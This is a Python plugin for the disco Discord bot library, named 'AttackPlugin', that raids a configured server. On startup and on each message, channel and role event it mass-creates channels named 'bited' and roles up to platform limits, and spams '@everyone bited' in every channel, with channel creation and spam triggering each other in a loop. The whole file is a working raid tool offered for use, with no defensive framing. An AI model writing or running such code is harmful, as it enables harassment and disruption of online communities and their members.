from disco.bot import Plugin
import json, time

with open("config.json", "r") as datafile:
    data = json.load(datafile)
print('ok')
class AttackPlugin(Plugin):

    @Plugin.listen('Ready')
    def on_ready(self, event):
        time.sleep(2)
        if data["create_channels"] == "true":
            if len(self.bot.client.state.guilds.get(data["guild"]).channels) < 500:
                self.bot.client.state.guilds.get(data["guild"]).create_text_channel('bited')
        if data["create_roles"] == "true":
            if len(self.bot.client.state.guilds.get(data["guild"]).roles) < 250:
                self.bot.client.state.guilds.get(data["guild"]).create_role()
        if data["spam"] == "true":
            for channel in (self.bot.client.state.guilds.get(data["guild"]).channels):
                self.bot.client.state.channels.get(channel).send_message('@everyone bited')

    @Plugin.listen('MessageCreate')
    def on_message_create(self, event):
        if data["spam"] == "true":
            event.channel.send_message('@everyone bited')
        
    @Plugin.listen('Guild_Role_Create')
    def on_guild_role_create(self, event):
        if data["create_roles"] == "false":
            if len(self.bot.client.state.guilds.get(data["guild"]).roles) < 250:
                self.bot.client.state.guilds.get(data["guild"]).create_role()

    @Plugin.listen('Channel_Create')
    def on_channel_create(self, event):
        if data["spam"] == "true":
            event.send_message('@everyone bited')
            if data["create_channels"] == "true":
                if len(self.bot.client.state.guilds.get(data["guild"]).channels) < 500:
                    self.bot.client.state.guilds.get(data["guild"]).create_text_channel('bited')